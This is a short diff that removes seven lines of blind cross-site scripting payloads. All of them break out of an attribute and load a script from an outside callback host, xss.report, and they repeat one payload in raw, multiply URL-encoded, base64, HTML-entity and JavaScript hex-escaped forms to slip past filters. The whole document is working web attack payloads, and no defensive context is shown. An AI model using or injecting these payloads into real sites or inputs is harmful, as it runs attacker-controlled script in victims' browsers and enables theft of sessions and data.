@@ -1,7 +1,0 @@
-'"><script src=https://xss.report/c/hnterx?raw></script>
-'%22%3E%3Cscript%20src=https://xss.report/c/hnterx%3E%3C/script%3E
-%2527%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fxss.report%252Fc%252Fhnterx%253Furl2%253E%253C%252Fscript%253E
-%252527%252522%25253E%25253Cscript%252520src%25253Dhttps%25253A%25252F%25252Fxss.report%25252Fc%25252Fhnterx%25253Furl3%25253E%25253C%25252Fscript%25253E
-JyI+PHNjcmlwdCBzcmM9aHR0cHM6Ly94c3MucmVwb3J0L2MvaG50ZXJ4P2Jhc2U2ND48L3NjcmlwdD4=
-&#x27;&quot;&gt;&lt;script src=https://xss.report/c/hnterx?htmlent&gt;&lt;/script&gt;
-\x27\x22\x3e\x3c\x73\x63\x72\x69\x70\x74\x20\x73\x72\x63\x3d\x68\x74\x74\x70\x73\x3a\x2f\x2f\x78\x73\x73\x2e\x72\x65\x70\x6f\x72\x74\x2f\x63\x2f\x68\x6e\x74\x65\x72\x78\x3f\x4a\x53\x68\x65\x78\x3e\x3c\x2f\x73\x63\x72\x69\x70\x74\x3e
